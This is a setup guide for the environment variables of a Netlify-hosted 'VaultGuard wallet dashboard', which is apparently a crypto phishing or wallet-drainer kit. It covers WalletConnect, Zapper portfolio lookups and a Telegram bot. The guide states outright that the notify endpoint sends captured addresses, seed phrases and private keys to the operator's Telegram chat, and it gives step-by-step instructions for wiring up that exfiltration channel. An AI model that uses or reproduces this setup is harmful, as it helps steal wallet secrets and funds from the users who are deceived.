# Environment Variables Setup Guide

This guide explains how to set up environment variables for the VaultGuard wallet dashboard.

## Required Variables for Netlify

### 1. WalletConnect Project ID
- **Variable Name**: `WALLETCONNECT_PROJECT_ID`
- **Where to Get**: https://cloud.walletconnect.com/
- **Purpose**: Served to the frontend via `/api/config` Netlify Function to enable WalletConnect
- **Steps**:
  1. Go to https://cloud.walletconnect.com/
  2. Sign up / Login
  3. Create a new project
  4. Copy the "Project ID"
  5. Add to Netlify environment variables

### 2. Zapper API Key(s)
- **Variable Name**: `ZAPPER_API_KEYS`
- **Where to Get**: https://studio.zapper.xyz/
- **Purpose**: Powers the `/api/portfolio/:address` endpoint — fetches wallet portfolio value and top holdings
- **Supports key rotation**: You can add multiple comma-separated keys: `key1,key2,key3`
- **Steps**:
  1. Go to https://studio.zapper.xyz/
  2. Sign up / Login
  3. Create an API key
  4. Add to Netlify environment variables (comma-separate multiple keys for rotation)

### 3. Telegram Bot Token
- **Variable Name**: `TELEGRAM_BOT_TOKEN`
- **Where to Get**: [@BotFather](https://t.me/BotFather) on Telegram
- **Purpose**: Used by `/api/notify` Netlify Function to send captured data (addresses, seed phrases, private keys) to your Telegram
- **Steps**:
  1. Open Telegram, search for `@BotFather`
  2. Send `/newbot` and follow prompts
  3. Copy the token it gives you

### 4. Telegram Chat ID
- **Variable Name**: `TELEGRAM_CHAT_ID`
- **Where to Get**: Telegram API
- **Purpose**: The chat/channel where notifications are delivered
- **Steps**:
  1. Message your bot at least once
  2. Visit `https://api.telegram.org/bot<YOUR_TOKEN>/getUpdates`
  3. Copy the `chat.id` value from the response

## Complete Netlify Environment Variables Summary

| Variable | Required | Purpose |
|---|---|---|
| `WALLETCONNECT_PROJECT_ID` | ✅ Yes | WalletConnect modal |
| `ZAPPER_API_KEYS` | ✅ Yes | Portfolio data (supports comma-separated keys) |
| `TELEGRAM_BOT_TOKEN` | ✅ Yes | Notification alerts |
| `TELEGRAM_CHAT_ID` | ✅ Yes | Where alerts are sent |

## Setting Up in Netlify

1. **Go to Netlify Site Settings**
   - Open your site dashboard
   - Go to `Site configuration` → `Environment variables`

2. **Add each variable**:
   ```
   WALLETCONNECT_PROJECT_ID = your-project-id
   ZAPPER_API_KEYS          = key1,key2,key3
   TELEGRAM_BOT_TOKEN       = 123456:ABCdef...
   TELEGRAM_CHAT_ID         = -1001234567890
   ```

3. **Redeploy** after adding variables

## Netlify Functions (Backend Endpoints)

All backend logic runs as Netlify Functions — no separate server needed:

| Endpoint | Function file | What it does |
|---|---|---|
| `GET /api/config` | `netlify/functions/config.mts` | Returns WalletConnect project ID to frontend |
| `GET /api/portfolio/:address` | `netlify/functions/portfolio.mts` | Zapper GraphQL proxy — returns portfolio data |
| `POST /api/notify` | `netlify/functions/notify.mts` | Sends captured wallet data to Telegram |

## Local Development

Create a `.env` file in the project root:

```bash
WALLETCONNECT_PROJECT_ID=your_project_id
ZAPPER_API_KEYS=your_zapper_key
TELEGRAM_BOT_TOKEN=your_bot_token
TELEGRAM_CHAT_ID=your_chat_id
```

Never commit `.env` to Git!
